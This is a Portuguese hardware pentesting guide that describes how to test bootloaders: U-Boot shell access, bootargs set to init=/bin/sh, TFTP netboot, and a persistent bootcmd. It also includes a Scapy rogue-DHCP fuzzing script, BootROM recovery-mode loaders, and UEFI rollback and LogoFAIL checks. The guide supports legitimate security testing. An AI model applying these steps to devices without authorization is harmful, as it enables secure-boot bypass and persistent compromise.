# Testes de Bootloader

{{#include ../../banners/hacktricks-training.md}}

Os passos a seguir são recomendados para modificar configurações de inicialização do dispositivo e testar bootloaders como U-Boot e loaders da classe UEFI. Foque em obter execução de código cedo, avaliar proteções de assinatura/rollback e abusar de caminhos de recuperação ou boot pela rede.

## U-Boot: dicas rápidas e abuso do ambiente

1. Acessar o shell do interpretador
- Durante o boot, pressione uma tecla de interrupção conhecida (frequentemente qualquer tecla, 0, espaço, ou uma sequência "mágica" específica da placa) antes que `bootcmd` seja executado para cair no prompt do U-Boot.

2. Inspecionar estado de boot e variáveis
- Comandos úteis:
- `printenv` (dump do environment)
- `bdinfo` (informações da board, endereços de memória)
- `help bootm; help booti; help bootz` (métodos suportados de boot de kernel)
- `help ext4load; help fatload; help tftpboot` (loaders disponíveis)

3. Modificar argumentos de boot para obter um shell root
- Acrescente `init=/bin/sh` para que o kernel abra um shell ao invés do init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # ou: run bootcmd
```

4. Netboot do seu servidor TFTP
- Configure a rede e busque um kernel/fit image da LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistir alterações via environment
- Se o armazenamento do env não estiver write-protected, você pode persistir o controle:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam caminhos de fallback. Valores mal configurados podem permitir repetidas quebras para o shell.

6. Verificar recursos de debug/inseguros
- Procure por: `bootdelay` > 0, `autoboot` desabilitado, `usb start; fatload usb 0:1 ...` sem restrições, capacidade de `loady`/`loads` via serial, `env import` de mídia não confiável, e kernels/ramdisks carregados sem checagens de assinatura.

7. Teste de imagem/verificação do U-Boot
- Se a plataforma afirma secure/verified boot com FIT images, teste tanto imagens unsigned quanto adulteradas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- A ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou o comportamento legado `verify=n` frequentemente permite boot de payloads arbitrários.

## Superfície de boot pela rede (DHCP/PXE) e servidores maliciosos

8. Fuzzing de parâmetros PXE/DHCP
- O tratamento legacy BOOTP/DHCP do U-Boot já apresentou problemas de segurança de memória. Por exemplo, CVE‑2024‑42040 descreve divulgação de memória via respostas DHCP forjadas que podem leak bytes da memória do U-Boot de volta na rede. Exercite os caminhos de código DHCP/PXE com valores excessivamente longos/casos de borda (option 67 bootfile-name, vendor options, file/servername fields) e observe travamentos/leaks.
- Snippet mínimo em Scapy para pressionar parâmetros de boot durante o netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Também valide se os campos de filename do PXE são passados para a lógica do shell/loader sem sanitização quando encadeados a scripts de provisionamento do lado do OS.

9. Teste de injeção de comandos via servidor DHCP/PXE malicioso
- Monte um serviço DHCP/PXE malicioso e tente injetar caracteres nos campos filename ou options para alcançar interpretadores de comando em estágios posteriores da cadeia de boot. O auxiliary DHCP do Metasploit, `dnsmasq`, ou scripts Scapy customizados funcionam bem. Isole a rede do laboratório antes de testar.

## Modos de recuperação BootROM de SoC que substituem o boot normal

Muitos SoCs expõem um modo de BootROM "loader" que aceitará código por USB/UART mesmo quando imagens em flash são inválidas. Se eFuses de secure-boot não estiverem queimados, isso pode fornecer execução arbitrária de código muito cedo na cadeia.

- NXP i.MX (Serial Download Mode)
- Tools: `uuu` (mfgtools3) or `imx-usb-loader`.
- Example: `imx-usb-loader u-boot.imx` to push and run a custom U-Boot from RAM.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Example: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` or `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Example: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` to stage a loader and upload a custom U-Boot.

Avalie se o dispositivo tem eFuses/OTP de secure-boot queimados. Caso contrário, modos de download do BootROM frequentemente contornam qualquer verificação de nível superior (U-Boot, kernel, rootfs) executando seu payload de primeira fase diretamente em SRAM/DRAM.

## UEFI/bootloaders para PCs: verificações rápidas

10. Manipulação do ESP e testes de rollback
- Monte a EFI System Partition (ESP) e verifique por componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, caminhos de logo do vendor.
- Tente bootar com componentes de boot assinados degradados ou conhecidos vulneráveis se revocações do Secure Boot (dbx) não estiverem atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, você frequentemente pode carregar seu próprio kernel ou `grub.cfg` a partir do ESP para ganhar persistência.

11. Bugs de parsing de logo de boot (classe LogoFAIL)
- Diversos firmwares OEM/IBV foram vulneráveis a falhas de parsing de imagens em DXE que processam logos de boot. Se um atacante puder colocar uma imagem craftada no ESP sob um caminho específico do vendor (por exemplo, `\EFI\<vendor>\logo\*.bmp`) e reiniciar, a execução de código durante o early boot pode ser possível mesmo com Secure Boot habilitado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses caminhos são graváveis a partir do OS.

## Cuidados com hardware

Seja cauteloso ao interagir com SPI/NAND flash durante o early boot (por exemplo, aterrar pinos para contornar leituras) e sempre consulte o datasheet do flash. Curtos mal cronometrados podem corromper o dispositivo ou o programador.

## Notas e dicas adicionais

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para mover blobs de environment entre RAM e storage; algumas plataformas permitem importar env de mídia removível sem autenticação.
- Para persistência em sistemas Linux que bootam via `extlinux.conf`, modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot frequentemente é suficiente quando não há checagens de assinatura.
- Se o userland fornece `fw_printenv/fw_setenv`, valide que `/etc/fw_env.config` corresponda ao armazenamento real do env. Offsets mal configurados permitem ler/escrever a região MTD errada.

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
